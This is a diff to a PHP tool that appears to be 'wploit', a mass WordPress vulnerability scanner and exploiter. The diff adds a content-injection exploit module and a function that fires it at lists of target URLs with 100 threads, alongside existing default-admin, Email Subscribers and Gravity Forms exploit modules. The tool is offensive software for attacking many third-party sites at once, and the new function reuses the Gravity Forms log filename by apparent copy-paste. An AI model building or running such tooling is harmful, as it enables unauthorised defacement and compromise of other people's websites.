@@ -1,5 +1,5 @@
 <?php
-error_reporting(0);
+//error_reporting(0);
 session_start();
 define('SENDINBOX_PATH', realpath(dirname(__FILE__)));
 require_once("Modules/database.php");
@@ -10,11 +10,12 @@ require_once("Modules/scanner.php");
 require_once("Exploit/default-admin.php");
 require_once("Exploit/plugins-email-subscribers.php");
 require_once("Exploit/plugins-gravityforms.php");
+require_once("Exploit/wp-content-injection.php");
 /**
  * @Author: Eka Syahwan
  * @Date:   2017-12-11 17:01:26
  * @Last Modified by:   shor7cut
- * @Last Modified time: 2018-09-13 12:17:50
+ * @Last Modified time: 2018-09-14 12:59:54
 */
 class wploit
 {
@@ -29,10 +30,11 @@ class wploit
 		$this->ExploitDefaultAdmin 				= new ExploitDefaultAdmin;
 		$this->Exploit_Plugins_emailsubscribers = new Exploit_Plugins_emailsubscribers;
 		$this->Exploit_Plugins_gravityforms 	= new Exploit_Plugins_gravityforms;
+		$this->Exploit_wp_content_injection 	= new Exploit_wp_content_injection;
 
 
 	  	echo $this->wploit_modules->color("green","\n========================================================\r\n\n");
-        echo $this->wploit_modules->color("green","┌─┐┬  ┬┌─┐┌─┐┌─┐┌┐┌┌┐┌┌─┐┬─┐ Version : 1.1\r\n");
+        echo $this->wploit_modules->color("green","┌─┐┬  ┬┌─┐┌─┐┌─┐┌┐┌┌┐┌┌─┐┬─┐ Version : 1.0\r\n");
 		echo $this->wploit_modules->color("green","└─┐└┐┌┘└─┐│  ├─┤││││││├┤ ├┬┘ Author  : Eka Syahwan\r\n");
 		echo $this->wploit_modules->color("green","└─┘ └┘ └─┘└─┘┴ ┴┘└┘┘└┘└─┘┴└─\r\n");
        	echo $this->wploit_modules->color("random","\r\n-= Scanner Vulnerability And MaSsive Exploit =-\r\n");
@@ -50,10 +52,10 @@ class wploit
 		}
 		echo $this->wploit_modules->color("random","\n========================================================\r\n\n");
 		$select = $this->wploit_modules->stuck("Select Number : ");
-		$threads = $this->wploit_modules->stuck("Threads : ");
+		//$threads = $this->wploit_modules->stuck("Threads : ");
 		
 		//$select  	= 3;
-		//$threads  	= 500;
+		$threads  	= 100;
 
 		$this->wploit_modules->threads 	= $threads;
 		
@@ -78,6 +80,9 @@ class wploit
 					case 'Gravity_Forms':
 						$this->exploit_Gravity_Forms();
 					break;
+					case 'content_injection':
+						$this->exploit_content_injection();
+					break;
 					default:
 						die('!error!');
 					break;
@@ -95,9 +100,10 @@ class wploit
 			break;
 		}
 	}
-	function filter_domain($url){
-		$url = parse_url($url);
-		return $url['scheme']."://".$url['host'];
+	function filter_domain($urlS){
+		$url = parse_url($urlS);
+		$url = (!isset($url["scheme"]) ? "http://".$urlS : $url["scheme"]."://".$url["host"]);
+		return $url;
 	}
 	function scanner_plugins(){
 		$dataConfig = $this->wploit_modules->required();
@@ -189,6 +195,24 @@ class wploit
 			}
 			fclose($fopn);
 			$this->Exploit_Plugins_gravityforms->scanner($config_url , "Line : ".$logScan." of ".ceil((count($dataConfig['list'])*$dataConfig['threads'])) ); unset($config_url);
+			sleep($dataConfig['delay']);
+		}
+	}
+	function exploit_content_injection(){
+		$dataConfig = $this->wploit_modules->required();
+		$xselc  	= $this->wploit_modules->stuck("Total Request : ".(count($dataConfig['list'])*$dataConfig['threads'])." , Keep going ? [0 = NO , 1 = YES] : ");echo "\r\n";
+		if($xselc == 0){
+			die('!error!');
+		}
+		foreach ($dataConfig['list'] as $keys => $dataurl) {
+			$fopn = fopen("log/log-Exploit_Plugins_Gravity_Forms-".$dataConfig['namafile'].".txt", "w");
+			foreach ($dataurl as $ukey => $url) {
+				$logScan 	  = ($logScan+1);
+				$config_url[] =  array('url' => $this->filter_domain($url));
+				fwrite($fopn, $ukey."|".$url."\r\n");
+			}
+			fclose($fopn);
+			$this->Exploit_wp_content_injection->scanner($config_url , "Line : ".$logScan." of ".ceil((count($dataConfig['list'])*$dataConfig['threads'])) ); unset($config_url);
 			sleep($dataConfig['delay']);
 		}
 	}
